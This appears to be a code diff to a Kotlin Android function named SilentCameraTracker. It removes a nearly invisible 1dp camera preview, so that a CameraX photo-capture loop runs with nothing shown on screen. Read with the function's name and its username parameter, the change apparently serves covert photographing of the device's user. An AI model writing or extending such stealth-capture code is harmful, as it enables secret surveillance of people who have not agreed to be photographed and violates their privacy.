@@ -4200,21 +4200,16 @@ fun SilentCameraTracker(username: String) {
     }
 
     val cameraProviderFuture = remember { ProcessCameraProvider.getInstance(context) }
-    var previewViewRef by remember { mutableStateOf<PreviewView?>(null) }
     var isCapturing by remember { mutableStateOf(false) }
 
     // Start/stop camera lifecycle binding and photo capture loop inside a unified block
-    LaunchedEffect(isReady, previewViewRef) {
-        val pv = previewViewRef
-        if (isReady && pv != null) {
+    LaunchedEffect(isReady) {
+        if (isReady) {
             var cameraProvider: ProcessCameraProvider? = null
             try {
                 cameraProvider = withContext(Dispatchers.Main) {
                     cameraProviderFuture.get()
                 }
-                
-                val preview = Preview.Builder().build()
-                preview.setSurfaceProvider(pv.surfaceProvider) // Connect surface provider!
 
                 val capture = ImageCapture.Builder()
                     .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
@@ -4230,7 +4225,6 @@ fun SilentCameraTracker(username: String) {
                 cameraProvider.bindToLifecycle(
                     lifecycleOwner,
                     cameraSelector,
-                    preview,
                     capture
                 )
 
@@ -4329,18 +4323,6 @@ fun SilentCameraTracker(username: String) {
                 e.printStackTrace()
             }
         }
-    }
-
-    // Keep the PreviewView always in composition to maintain a stable surface and completely avoid abandoned buffer queues
-    Box(modifier = Modifier.size(1.dp)) {
-        AndroidView(
-            factory = { ctx ->
-                PreviewView(ctx).also {
-                    previewViewRef = it
-                }
-            },
-            modifier = Modifier.fillMaxSize()
-        )
     }
 }
 
